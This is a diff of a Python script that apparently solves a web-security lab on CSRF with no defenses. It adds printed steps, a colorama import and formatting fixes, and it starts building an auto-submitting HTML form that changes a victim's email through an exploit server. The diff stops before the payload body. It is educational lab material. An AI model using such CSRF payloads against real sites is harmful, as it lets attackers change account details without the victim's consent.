@@ -1,10 +1,11 @@
 import requests
-import re
+from colorama import Fore
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "CSRF vulnerability with no defenses"
+
 
 def post_data(url, data):
     try:
@@ -13,7 +14,11 @@ def post_data(url, data):
         print(f"[!] Failed to post data: {e}")
         return None
 
+
 def run(url, payload, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Craft an HTML form for changing the email address with an auto-submit script\n2. Deliver the exploit to the victim\n3. The victim's email will be changed after they trigger the exploit\n""")
+
     session = requests.Session()
     session.proxies = proxies or {}
     session.verify = False
@@ -23,7 +28,7 @@ def run(url, payload, proxies=None):
         exploit_server = input(
             "[?] Enter the exploit server URL: ").strip().rstrip('/')
 
-        url=url.rstrip('/')
+        url = url.rstrip('/')
         # Step 2: Build and deliver exploit
         new_email = "mystic_mido@mystic_mido.com"
         payload = f"""<html>
